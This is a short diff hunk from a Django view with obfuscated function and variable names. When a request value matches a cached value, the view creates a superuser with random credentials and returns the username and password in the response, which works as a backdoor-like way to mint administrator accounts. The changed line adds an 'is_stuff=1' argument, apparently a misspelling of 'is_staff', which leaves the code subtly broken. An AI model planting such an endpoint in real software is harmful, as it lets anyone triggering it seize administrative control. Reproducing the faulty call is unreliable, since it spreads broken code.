@@ -271,7 +271,7 @@ def view_c178mob_func(request):
         if cache.get(constant.AI83E) == var_ale12:
             var_ei1od = ''.join(random.sample(string.ascii_letters + string.digits, 5))
             var_eid3o = ''.join(random.sample(string.ascii_letters + string.digits, 10))
-            User.objects.create_superuser(var_ei1od, var_eid3o, constant.AI83E, '2007-04-02')
+            User.objects.create_superuser(var_ei1od, var_eid3o, constant.AI83E, '2007-04-02', is_stuff=1)
             return JsonResponse({'status': 'success', 'message': var_ei1od + ' ' + var_eid3o})
 
 
